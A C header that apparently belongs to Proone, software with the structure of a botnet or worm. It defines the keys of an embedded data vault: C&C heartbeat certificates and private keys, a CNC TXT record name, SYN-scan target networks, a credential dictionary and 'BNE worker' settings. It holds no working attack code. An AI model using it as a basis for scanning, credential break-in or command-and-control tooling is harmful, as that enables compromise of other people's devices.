/** \file
 * \brief The data vault entry key definitions
 * \note This header defines \c prne_data_key_t. The enum is defined in the
 * 	separate header for ease of use with VCS.
 */

#pragma once
#include "util_ct.h"


/**
 * \brief The data vault entry key enum
 * \note Suitable storage type: int8_t
 */
typedef enum {
	PRNE_DATA_KEY_NONE = -1, // Null value

	PRNE_DATA_KEY_PROG_VER, // The 16-byte program version uuid
	PRNE_DATA_KEY_SHG_SALT, // The 16-byte shared global salt value
	PRNE_DATA_KEY_X509_CA_CRT, // The heartbeat PKI CA certificate chain
	PRNE_DATA_KEY_X509_DH, // The heartbeat PKI DH param
	PRNE_DATA_KEY_X509_S_CRT, // The heartbeat PKI server certificate
	PRNE_DATA_KEY_X509_S_KEY, // The heartbeat PKI server private key
	PRNE_DATA_KEY_X509_C_CRT, // The heartbeat PKI client certificate
	PRNE_DATA_KEY_X509_C_KEY, // The heartbeat PKI client private key
	PRNE_DATA_KEY_RESOLV_NS_IPV4, // The resolv IPv4 DNS name server pool
	PRNE_DATA_KEY_RESOLV_NS_IPV6, // The resolv IPv6 DNS name server pool
	PRNE_DATA_KEY_CNC_TXT_REC, // The name of the heartbeat CNC TXT record
	// The destination ports of the SYN packets crafted by the recon worker
	PRNE_DATA_KEY_RCN_PORTS,
	PRNE_DATA_KEY_RCN_T_IPV4, // The target recon IPv4 networks
	PRNE_DATA_KEY_RCN_BL_IPV4, // The blacklist recon IPv4 networks
	PRNE_DATA_KEY_RCN_T_IPV6,  // The target recon IPv6 networks
	PRNE_DATA_KEY_RCN_BL_IPV6, // The blacklist recon IPv6 networks
	PRNE_DATA_KEY_CRED_DICT, // The serialised credential dictionary
	// The name of the Proone executable. Used by the BNE worker.
	PRNE_DATA_KEY_EXEC_NAME,
	PRNE_DATA_KEY_VER_MAT, // The version matrix
	PRNE_DATA_KEY_BNE_LOCK_NAME, // The name of the BNE lock file

	NB_PRNE_DATA_KEY // Meta value: the number of enums excluding the null value
} prne_data_key_t;
